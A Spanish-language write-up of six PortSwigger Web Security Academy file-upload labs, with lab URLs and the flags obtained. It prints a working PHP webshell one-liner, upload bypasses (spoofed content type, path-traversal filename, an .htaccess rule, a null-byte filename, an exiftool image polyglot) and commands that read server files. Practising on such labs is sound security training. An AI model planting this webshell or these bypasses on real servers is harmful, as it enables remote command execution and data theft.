#PortSwigger - Webshell

## Lab1
En este lab, se nos presenta un sistema de login donde podemos subir un archivo sin sanitizar. Subimos un archivo PHP como "pwned.php" y accedemos a la webshell con el siguiente enlace:

https://0a81006804832510849c04de00e800b0.web-security-academy.net/files/avatars/pwned.php?cmd=whoami

Respuesta:
- carlos

El contenido de la webshell es el siguiente:

• <?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>


Luego, para completar el lab, accedemos a la carpeta `/home/carlos/secret` para encontrar la flag:

https://0a81006804832510849c04de00e800b0.web-security-academy.net/files/avatars/pwned.php?cmd=cat%20/home/carlos/secret

Respuesta:
- 4ThqTUOfwcuCkavnxxofmt8g9lmf5Ozj

# Lab2
En este lab, se nos impide subir archivos PHP, pero podemos eludir esta restricción utilizando BurpSuite. Modificamos la petición para cambiar el tipo de contenido a "image/png" y subimos el archivo "pwned.php". Luego, ejecutamos la webshell:

https://0a81006804832510849c04de00e800b0.web-security-academy.net/files/avatars/pwned.php?cmd=cat%20/home/carlos/secret

Respuesta:
- aBKOzOBOVJm8gcKUDu4YSdYTiSt3nnEm

## Lab3
En este lab, la carpeta "/avatars" está sanitizada, por lo que debemos realizar un ataque de path traversal. Subimos la webshell como "../pwned.php" de forma que evitemos el directorio sanitizado mediante un bypass con el nombre y utilizamos BurpSuite para cambiar el nombre del archivo. Luego, accedemos a la webshell en la nueva ubicación:

https://0a6f0056042de6df8351a56a00f00063.web-security-academy.net/files/pwned.php?cmd=whoami

Respuesta:
- carlos

Para obtener la flag:

https://0a6f0056042de6df8351a56a00f00063.web-security-academy.net/files/pwned.php?cmd=cat%20/home/carlos/secret

Respuesta:
- lQZg3EpoTDXqTBUsJGj4kG1K6gtvelMx

# Lab4
En este lab, no se permite la ejecución de archivos .php. Cambiamos la extensión del archivo a ".png" y subimos un archivo ".htaccess" para permitir la ejecución de archivos ".png" como ".php". Ejecutamos la webshell:

https://0a3700c704dca7b28081adda00cd0094.web-security-academy.net/files/avatars/pwned.png?cmd=cat%20/home/carlos/secret

Contenido de ".htaccess" es el siguiente:

•AddType application/x-httpd-php .png

Respuesta:
- z0X9db4IUCnJOKli3LpTghJtobI5pmGD

# Lab5
En este lab, solo se permiten archivos ".png" y ".jpeg". Utilizamos BurpSuite para cambiar el nombre del archivo y el tipo de contenido para eludir la restricción. Subimos el archivo como "pwned.php%00.png" y ejecutamos la webshell:

https://0abb00e3043ba7768096c6bb0014005b.web-security-academy.net/files/avatars/pwned.php?cmd=cat%20/home/carlos/secret

Respuesta:
- ggRQHtZZeBt2dChk990rBYnkZcVnqs2E

# Lab6
En este lab, solo se permiten imágenes. Utilizamos la herramienta "exiftool" para mezclar el código PHP con una imagen. Subimos el archivo "exploit.php" y ejecutamos la webshell:

Primero descargamos una imagen cualquiera con el nombre, en este caso  "United.png"y luego con el siguiente comando hacemos que la imagen contenga el codigo php malicioso:

>exiftool -Comment='<?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";?>' /home/kali/Desktop/Untitled.png -o exploit.php

https://0a93002604f390db8204936f0030003d.web-security-academy.net/files/avatars/exploit.php?cmd=cat%20/home/carlos/secret

Respuesta:
- YpUjBhe6HOxnddYWHLnHLyfyDAm1CIVF
